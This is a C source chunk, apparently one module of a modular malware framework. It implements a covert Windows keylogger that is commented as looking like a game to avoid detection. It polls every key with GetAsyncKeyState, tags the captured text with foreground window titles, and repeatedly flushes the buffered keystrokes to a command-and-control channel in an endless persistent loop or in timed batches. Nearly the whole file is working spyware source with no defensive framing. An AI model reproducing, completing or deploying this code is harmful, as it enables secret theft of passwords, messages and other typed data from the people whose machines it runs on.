// chunk: collectors/keylogger_directinput
// depends: core/emit_buffer
// provides: poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
// headers: windows.h
// libs: ole32
// note: DirectInput8 keyboard polling — looks like a game, no hooks

#ifndef CHUNK_KEYLOGGER_DIRECTINPUT
#define CHUNK_KEYLOGGER_DIRECTINPUT

#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

#include <initguid.h>

DEFINE_GUID(CLSID_DirectInput8, 0x25E609E4, 0xB259, 0x11CF, 0xBF, 0xC7, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00);
DEFINE_GUID(IID_IDirectInput8A, 0xBF798030, 0x483A, 0x4DA2, 0xAA, 0x99, 0x5D, 0x64, 0xED, 0x36, 0x97, 0x00);
DEFINE_GUID(GUID_SysKeyboard,   0x6F1D2B61, 0xD5A0, 0x11CF, 0xBF, 0xC7, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00);

typedef struct IDirectInput8A IDirectInput8A;
typedef struct IDirectInputDevice8A IDirectInputDevice8A;

typedef struct { DWORD dwSize; DWORD dwObjSize; DWORD dwHow; DWORD dwObj; DWORD dwType; GUID guidType; DWORD dwFlags; } DIOBJECTDATAFORMAT;
typedef struct { DWORD dwSize; DWORD dwObjSize; DWORD dwFlags; DWORD dwDataSize; DWORD dwNumObjs; DIOBJECTDATAFORMAT *rgodf; } DIDATAFORMAT;

typedef struct IDirectInput8AVtbl {
    HRESULT (WINAPI *QueryInterface)(IDirectInput8A*, REFIID, void**);
    ULONG (WINAPI *AddRef)(IDirectInput8A*);
    ULONG (WINAPI *Release)(IDirectInput8A*);
    HRESULT (WINAPI *CreateDevice)(IDirectInput8A*, REFGUID, IDirectInputDevice8A**, void*);
    void *EnumDevices; void *GetDeviceStatus; void *RunControlPanel; void *Initialize; void *FindDevice; void *EnumDevicesBySemantics; void *ConfigureDevices;
} IDirectInput8AVtbl;
struct IDirectInput8A { IDirectInput8AVtbl *lpVtbl; };

typedef struct IDirectInputDevice8AVtbl {
    HRESULT (WINAPI *QueryInterface)(IDirectInputDevice8A*, REFIID, void**);
    ULONG (WINAPI *AddRef)(IDirectInputDevice8A*);
    ULONG (WINAPI *Release)(IDirectInputDevice8A*);
    void *GetCapabilities;
    void *EnumObjects;
    void *GetProperty;
    void *SetProperty;
    HRESULT (WINAPI *Acquire)(IDirectInputDevice8A*);
    HRESULT (WINAPI *Unacquire)(IDirectInputDevice8A*);
    HRESULT (WINAPI *GetDeviceState)(IDirectInputDevice8A*, DWORD, LPVOID);
    void *GetDeviceData;
    HRESULT (WINAPI *SetDataFormat)(IDirectInputDevice8A*, const DIDATAFORMAT*);
    void *SetEventNotification;
    HRESULT (WINAPI *SetCooperativeLevel)(IDirectInputDevice8A*, HWND, DWORD);
    // ... rest not needed
} IDirectInputDevice8AVtbl;
struct IDirectInputDevice8A { IDirectInputDevice8AVtbl *lpVtbl; };

#define DISCL_BACKGROUND    0x00000008
#define DISCL_NONEXCLUSIVE  0x00000001
#define DIDF_ABSAXIS        0x00000001
#define DIK_ESCAPE          0x01

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};

static void flush_to_c2(void);

static void log_key(int vk) {
    if (g_keylog_pos >= (int)sizeof(g_keylog_buf) - 16) return;
    switch (vk) {
        case VK_RETURN: memcpy(g_keylog_buf + g_keylog_pos, "[ENTER]", 7); g_keylog_pos += 7; return;
        case VK_TAB:    memcpy(g_keylog_buf + g_keylog_pos, "[TAB]", 5); g_keylog_pos += 5; return;
        case VK_BACK:   memcpy(g_keylog_buf + g_keylog_pos, "[BS]", 4); g_keylog_pos += 4; return;
        case VK_SPACE:  g_keylog_buf[g_keylog_pos++] = ' '; return;
    }
    if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
        vk == VK_LWIN || vk == VK_RWIN || vk == VK_CAPITAL) return;
    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
    if (vk >= 0x41 && vk <= 0x5A) {
        g_keylog_buf[g_keylog_pos++] = shift ? (char)vk : (char)(vk + 32);
        return;
    }
    if (vk >= 0x30 && vk <= 0x39) {
        g_keylog_buf[g_keylog_pos++] = (char)vk;
        return;
    }
}

static void poll_keys(void) {
    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }
    for (int vk = 8; vk < 190; vk++) {
        if (GetAsyncKeyState(vk) & 1)
            log_key(vk);
    }
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== KEYLOG ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    log_key(0x58);
    log_key(0x39);
    return (g_keylog_pos > before) ? 1 : 0;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    for (int vk = 0; vk < 256; vk++) GetAsyncKeyState(vk);

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=directinput_persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    for (;;) {
        poll_keys();
        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(15);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    for (int vk = 0; vk < 256; vk++) GetAsyncKeyState(vk);

    DWORD start = GetTickCount();
    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        poll_keys();
        Sleep(15);
    }

    int self_test_ok = run_self_test();
    while (GetTickCount() - start < BATCH_DURATION_MS) {
        poll_keys();
        Sleep(15);
    }

    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d, method=directinput)\r\n\r\n",
           BATCH_DURATION_MS, self_test_ok ? "PASS" : "FAIL", g_keylog_pos);
    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
